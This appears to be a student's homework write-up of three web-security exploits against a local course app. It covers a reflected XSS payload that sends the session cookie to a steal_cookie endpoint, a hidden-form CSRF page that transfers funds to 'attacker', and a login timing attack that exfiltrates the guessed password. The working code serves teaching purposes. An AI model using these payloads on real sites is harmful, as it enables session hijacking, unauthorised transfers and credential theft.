# 1. Alpha Exploit: Cookie Stealing

Due to the instructions given in the document, I found out that the vulnerability is located in the router.js file:

```javascript
router.get('/profile', asyncMiddleware(async (req, res, next) => {
  if(req.session.loggedIn == false) {
    render(req, res, next, 'login/form', 'Login', 'You must be logged in to use this feature!');
    return;
  };

  if(req.query.username != null) { // if visitor makes a search query
    const db = await dbPromise;
    const query = `SELECT * FROM Users WHERE username == "${req.query.username}";`;
    let result;
    try {
      result = await db.get(query);
    } catch(err) {
      result = false;
    }
    if(result) { // if user exists
      render(req, res, next, 'profile/view', 'View Profile', false, result);
    }
    else { // user does not exist
      render(req, res, next, 'profile/view', 'View Profile', `${req.query.username} does not exist!`, req.session.account);
    }
  } else { // visitor did not make query, show them their own profile
    render(req, res, next, 'profile/view', 'View Profile', false, req.session.account);
  }
}));
```

To be exact in the scenario where the username that is searched does not exist, the code renders `profile/view` displaying the message that `"<username> does not exist!"`. At this very part we can exploit the cookie by sending a request to the `/profile` path with the queryparam `username` which is not present in the database. With a malicious request in a script, the cookie can be stolen.
In details, The script get the cookie and sends it to the server.

As demonstrated in the question, we already have the url ``` url http://localhost:3000/profile?username=```

In the next step the url is followed by the script that steals the cookie and sends it to the server in addition to hiding the message that indicates there is no such username.

``` javascript
<script>
document.querySelector('.error').style.visibility = 'hidden';

var cookieValue = document.cookie.includes('session=')
    ? document.cookie.split('session=')[1].split(';')[0]
    : '';

new Image().src = `http://localhost:3000/steal_cookie?cookie=${cookieValue}`;
</script>
```
after writing the script, I encoded the script with the help of a website ```url https://www.urlencoder.org/``` and received the url below:

``` url
%3Cscript%3E%0Adocument.querySelector%28%27.error%27%29.style.visibility%20%3D%20%27hidden%27%3B%0A%0Avar%20cookieValue%20%3D%20document.cookie.includes%28%27session%3D%27%29%20%0A%20%20%20%20%3F%20document.cookie.split%28%27session%3D%27%29%5B1%5D.split%28%27%3B%27%29%5B0%5D%20%0A%20%20%20%20%3A%20%27%27%3B%0A%0Anew%20Image%28%29.src%20%3D%20%60http%3A%2F%2Flocalhost%3A3000%2Fsteal_cookie%3Fcookie%3D%24%7BcookieValue%7D%60%3B%0A%3C%2Fscript%3E%0A
```

and then in the terminal of the IDE (server) there was a log of the cookie I stole:

```
%3Cscript%3E%0Adocument.querySelector%28%27.error%27%29.style.visibility%20%3D%20%27hidden%27%3B%0A%0Avar%20cookieValue%20%3D%20document.cookie.includes%28%27session%3D%27%29%20%0A%20%20%20%20%3F%20document.cookie.split%28%27session%3D%27%29%5B1%5D.split%28%27%3B%27%29%5B0%5D%20%0A%20%20%20%20%3A%20%27%27%3B%0A%0Anew%20Image%28%29.src%20%3D%20%60http%3A%2F%2Flocalhost%3A3000%2Fsteal_cookie%3Fcookie%3D%24%7BcookieValue%7D%60%3B%0A%3C%2Fscript%3E%0A
```

and confirmed that the cookie theft was successful!

# 2. Bravo Exploit: Cross-site request forgery (CSRF)

For the first step we need to alter the changes in the browser's setting. In the privacy and security tab in firefox browser, we need to set the browser privacy to custom and enable cross-site tracking cookies.
![image](https://github.com/user-attachments/assets/570c15a7-a9f4-4e30-b11b-939e7b779aa6)


followed by that there is the `b.html` file to fill.

There are 3 parts to the code:

1. The script i‍n `<head>`

The JavaScript in the `<head>` defines and handles the malicious behavior of the page.
 
The `document.addEventListener("DOMContentLoaded", ...)` ensures the code runs only after the HTML document has fully loaded, and it guarantees that all elements like the form and iframe are accessible in the DOM before the script executes.
 
The constant `hijackUrl` stores the URL where the browser will redirect the user after the form submission process completes.
 
The variable let `isSubmitted = false` tracks whether the form has been submitted. It prevents accidental or repeated redirection before the form is submitted.
The `handleTransferAndRedirect()` function is the core function that selects the form `(document.forms['transfer_form'])` and iframe `(document.getElementById("transformiFrame"))`.It submits the form using `form.submit()` to send data to the target endpoint. Additionally, it sets `isSubmitted` to true to indicates that the form has been sent.

This function adds an event listener to the iframe's load event:
 
When the iframe finishes loading, the browser checks if the form submission was completed `(isSubmitted === true)`.

If true, the browser redirects the user to the `hijackUrl`.

For the final step of this part, the call to `handleTransferAndRedirect()` executes the function immediately after defining it to initiate the form submission and set up the iframe listener.

2. The form in `<body>`
 
The form, identified by the `id="transfer_form"`, is configured to silently submit data to a specified endpoint (`http://localhost:3000/post_transfer`) using the `POST` method, with the results directed to a hidden iframe (`target="transformiFrame"`).
 
It includes two hidden inputs: `destination_username`, preset to `"attacker"`, and `quantity`, set to `10`, ensuring the transfer operation remains invisible to the user. These attributes collectively enable the seamless execution of the attack without the user’s knowledge.
 
3. The iFrame in `<body>`
The hidden iframe, identified by `id="transformiFrame"`, serves as an invisible intermediary to handle the form's response without user awareness. Its `name="transformiFrame"` attribute matches the form's `target` attribute, ensuring the form's submission results are loaded into the iframe. Once the form submission is complete and the iframe finishes loading the response, a `load` event is triggered in the JavaScript, redirecting the user to the predefined `hijackUrl`. This setup enables a seamless, covert operation.
 
I originally wanted to use the Promise function to have the functions executing in row but for some reason it did not work. Instead, I used the target attribute for form. 
 
here are the links I used for this question:
```url https://www.w3schools.com/tags/att_form_target.asp```
```url https://stackoverflow.com/questions/37146241/promise-not-working-properly```

# 3. Gamma Exploit: Timing Attack
 
In this part of the Homework, a timming attack is going to be performed. In this Scenario, Since the computation time of the server for the correct and incorrect passwords are not the same, the attacker can figure out which password is the correct one. 
 
In the given file of the question, there is a dictionary of the possible passwords containing the correct password.
 
In the following steps, I'm going to explain the completed version of the template provided under the name `Gamma_Starter.html` named as g.txt:
``` javascript
var dictionary = [`password`, `123456`, `12345678`, `dragon`, `1234`, `qwerty`, `12345`];
      var index = 0;
      var timings = [];
      var test = document.getElementById("test");
```
The `timings` array has been added to store the time each password candidate takes.

```javascript
test.onerror = function () {
        var end = new Date();
        var timeTaken = end - start;

        console.log(`Attempt ${index}: Password: "${dictionary[index - 1]}", Time elapsed: ${timeTaken} ms`);
        timings.push({ index: index - 1, time: timeTaken });

        start = new Date();

        if (index < dictionary.length) {
          console.log(`Testing password: "${dictionary[index]}"...`);
          test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
        } else {
          var maxTimeEntry = timings.reduce((max, current) =>
            current.time > max.time ? current : max
          );
          var guessedPassword = dictionary[maxTimeEntry.index];
          console.log(
            `Guessed Password: "${guessedPassword}", Max Time: ${maxTimeEntry.time} ms`
          );
          var theftUrl = `http://localhost:3000/steal_password?password=${guessedPassword}&timeElapsed=${maxTimeEntry.time}`;
          console.log(`Sending theft request with password "${guessedPassword}"...`);
          var theftImage = new Image();
          theftImage.src = theftUrl;
        }
        index += 1;
      };
```
In the function, `timeTaking` has been added to calculate the exact time that a password takes time to be checked. 
 
Later, I placed a log in the code that each try for a password be logged and I would be able to check it in the logs of my docker container.
 
![image](https://github.com/user-attachments/assets/7e7924b0-aec8-4d97-b88a-b0fedcf41a0e)
 
After the logs, each timing is stored in the `timing` array.
 
As long as we have not reached the end of the array, each password is tested in the `test.src` url. After that the `maxTimeEntry` variable, stores the max time that a password has taken to be checked by being checked in the `else` with the current time.
 
In the next step, there is the `guessedPassword` variable holding the element in the dictionary via finding it by the index of `maxTimeEntry` and then it logs it.(The correct password can be seen in the image above.)
 
The last part of the code sends a request to a server with the guessed password and its response time by dynamically creating a URL (`theftUrl`). An `Image` object (`theftImage`) is used to initiate the request by setting its `src` property to the URL. This triggers an HTTP GET request, and a log indicates the request is being sent with the guessed password. 
